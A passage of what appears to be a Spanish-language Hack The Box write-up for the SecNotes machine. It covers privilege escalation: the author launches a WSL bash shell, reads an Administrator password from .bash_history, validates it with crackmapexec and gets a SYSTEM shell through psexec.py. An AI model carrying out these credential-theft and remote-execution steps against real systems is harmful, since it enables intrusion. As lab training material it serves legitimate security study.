+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\t</span>yler<span class="se">\D</span>esktop&gt; <span class="nv">$Wscript</span> <span class="o">=</span> New-Object <span class="nt">-ComObject</span> Wscript.Shell
+PS C:<span class="se">\U</span>sers<span class="se">\t</span>yler<span class="se">\D</span>esktop&gt; <span class="nv">$shortcut</span> <span class="o">=</span> Get-ChildItem bash.lnk
+PS C:<span class="se">\U</span>sers<span class="se">\t</span>yler<span class="se">\D</span>esktop&gt; <span class="nv">$Wscript</span>.CreateShortcut<span class="o">(</span><span class="nv">$shortcut</span><span class="o">)</span>
+
+
+FullName         : C:<span class="se">\U</span>sers<span class="se">\t</span>yler<span class="se">\D</span>esktop<span class="se">\b</span>ash.lnk
+Arguments        : 
+Description      : 
+Hotkey           : 
+IconLocation     : ,0
+RelativePath     : 
+TargetPath       : C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\b</span>ash.exe
+WindowStyle      : 1
+WorkingDirectory : C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32
+
+
+
+PS C:<span class="se">\U</span>sers<span class="se">\t</span>yler<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+
+<p>Aqui vemos que la ruta del archivo <code class="language-plaintext highlighter-rouge">bash</code> es bajo <code class="language-plaintext highlighter-rouge">C:\Windows\System32\bash.exe</code> y solo para confirmar, vamos a realizar una búsqueda recursiva en la raiz por <code class="language-plaintext highlighter-rouge">bash.exe</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\&gt;</span> Get-ChildItem <span class="nt">-Path</span> C:<span class="se">\ </span><span class="nt">-Filter</span> bash.exe <span class="nt">-Recurse</span> <span class="nt">-ErrorAction</span> SilentlyContinue <span class="nt">-Force</span>
+
+
+    Directory: C:<span class="se">\W</span>indows<span class="se">\W</span>inSxS<span class="se">\a</span>md64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5
+
+
+Mode                LastWriteTime         Length Name                                                                  
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                                                                  
+<span class="nt">-a----</span>        6/21/2018   3:02 PM         115712 bash.exe                                                              
+
+PS C:<span class="se">\&gt;</span> 
+</code></pre></div></div>
+
+<p>Con el comando anterior, vemos que el archivo está realmente bajo la ruta <code class="language-plaintext highlighter-rouge">C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5</code>. Ahora, pensando un poco, existe un archivo llamado <code class="language-plaintext highlighter-rouge">bash.exe</code> y si vemos los directorios en la raiz <code class="language-plaintext highlighter-rouge">C:\</code>, existe uno como se llama <code class="language-plaintext highlighter-rouge">Distros</code> y un archivo <code class="language-plaintext highlighter-rouge">Ubuntu.zip</code>; por lo que ya nos hace pensar que tal vez exista un servidor Ubuntu ejecutandose en la máquina y con el archivo <code class="language-plaintext highlighter-rouge">bash.exe</code> podríamos acceder a dicho servidor.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\&gt;</span> <span class="nb">dir
+ </span>Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is 1E7B-9B76
+
+ Directory of C:<span class="se">\</span>
+
+06/21/2018  02:07 PM    &lt;DIR&gt;          Distros
+06/21/2018  05:47 PM    &lt;DIR&gt;          inetpub
+06/22/2018  01:09 PM    &lt;DIR&gt;          Microsoft
+04/11/2018  03:38 PM    &lt;DIR&gt;          PerfLogs
+06/21/2018  07:15 AM    &lt;DIR&gt;          php7
+01/26/2021  02:39 AM    &lt;DIR&gt;          Program Files
+01/26/2021  02:38 AM    &lt;DIR&gt;          Program Files <span class="o">(</span>x86<span class="o">)</span>
+06/21/2018  02:07 PM       201,749,452 Ubuntu.zip
+06/21/2018  02:00 PM    &lt;DIR&gt;          Users
+01/26/2021  02:38 AM    &lt;DIR&gt;          Windows
+               1 File<span class="o">(</span>s<span class="o">)</span>    201,749,452 bytes
+               9 Dir<span class="o">(</span>s<span class="o">)</span>  13,910,695,936 bytes free
+
+C:<span class="se">\&gt;</span>
+</code></pre></div></div>
+
+<p>Por lo tanto, vamos a ejecutar <code class="language-plaintext highlighter-rouge">C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe</code> para ver que pasa.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\&gt;</span> C:<span class="se">\W</span>indows<span class="se">\W</span>inSxS<span class="se">\a</span>md64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5<span class="se">\b</span>ash.exe
+mesg: ttyname failed: Inappropriate ioctl <span class="k">for </span>device
+<span class="nb">whoami
+</span>root
+script /dev/null <span class="nt">-c</span> bash
+Script started, file is /dev/null
+root@SECNOTES:~# <span class="nb">whoami
+</span>root
+root@SECNOTES:~# ll
+total 8
+drwx------ 1 root root  512 Jun 22  2018 ./
+drwxr-xr-x 1 root root  512 Jun 21  2018 ../
+<span class="nt">----------</span> 1 root root  398 Jun 22  2018 .bash_history
+<span class="nt">-rw-r--r--</span> 1 root root 3112 Jun 22  2018 .bashrc
+<span class="nt">-rw-r--r--</span> 1 root root  148 Aug 17  2015 .profile
+drwxrwxrwx 1 root root  512 Jun 22  2018 filesystem/
+root@SECNOTES:~# <span class="nb">cat</span> .bash_history
+<span class="nb">cd</span> /mnt/c/
+<span class="nb">ls
+cd </span>Users/
+<span class="nb">cd</span> /
+<span class="nb">cd</span> ~
+<span class="nb">ls
+pwd
+mkdir </span>filesystem
+mount //127.0.0.1/c<span class="nv">$ </span>filesystem/
+<span class="nb">sudo </span>apt <span class="nb">install </span>cifs-utils
+mount //127.0.0.1/c<span class="nv">$ </span>filesystem/
+mount //127.0.0.1/c<span class="nv">$ </span>filesystem/ <span class="nt">-o</span> <span class="nv">user</span><span class="o">=</span>administrator
+<span class="nb">cat</span> /proc/filesystems
+<span class="nb">sudo </span>modprobe cifs
+smbclient
+apt <span class="nb">install </span>smbclient
+smbclient
+smbclient <span class="nt">-U</span> <span class="s1">'administrator%u6!4ZwgwOM#^OBf#Nwnh'</span> <span class="se">\\\\</span>127.0.0.1<span class="se">\\</span>c<span class="err">$</span>
+<span class="o">&gt;</span> .bash_history 
+less .bash_history
+exitroot@SECNOTES:~#
+</code></pre></div></div>
+
+<p>Si checamos el archivo <code class="language-plaintext highlighter-rouge">.bash_history</code>, podemos ver los comandos a ha hecho el usuario <strong>root</strong> del servidor Ubuntu y nos encontramos con algo curioso, unas credenciales del usuario <strong>Administrator</strong>, por lo que ya sabemos, guardamos todas las credenciales que encontremos y vamos a validarlas.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.97 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-p</span> <span class="s1">'u6!4ZwgwOM#^OBf#Nwnh'</span>
+SMB         10.10.10.97     445    SECNOTES         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Enterprise 17134 <span class="o">(</span>name:SECNOTES<span class="o">)</span> <span class="o">(</span>domain:SECNOTES<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.97     445    SECNOTES         <span class="o">[</span>+] SECNOTES<span class="se">\A</span>dministrator:u6!4ZwgwOM#^OBf#Nwnh <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Las credenciales son válidas y tenemos ejecución de comandos (<em>Pwn3d!</em>),  por lo tanto, nos conectamos a la máquina con la herramienta <code class="language-plaintext highlighter-rouge">psexec.py</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /root/.local/pipx/venvs/crackmapexec/bin/psexec.py WORKGROUP/Administrator:u6<span class="se">\!</span>4ZwgwOM#^OBf#Nwnh@10.10.10.97
+Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.97.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file bseZoTmQ.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.97.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service ZuAc on 10.10.10.97.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service ZuAc.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 10.0.17134.228]
+<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;whoami
+nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>INDOWS<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<p>Ya somos el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> y podemos visualizar la flag (root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#csrf" class="page__taxonomy-item" rel="tag">CSRF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#php" class="page__taxonomy-item" rel="tag">PHP</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#powershell" class="page__taxonomy-item" rel="tag">Powershell</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sql" class="page__taxonomy-item" rel="tag">SQL</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sqli" class="page__taxonomy-item" rel="tag">SQLi</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">Web</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#medium" class="page__taxonomy-item" rel="tag">Medium</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-12-26T00:00:00-06:00">December 26, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-shocker/" class="pagination--pager" title="Hack The Box Shocker
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
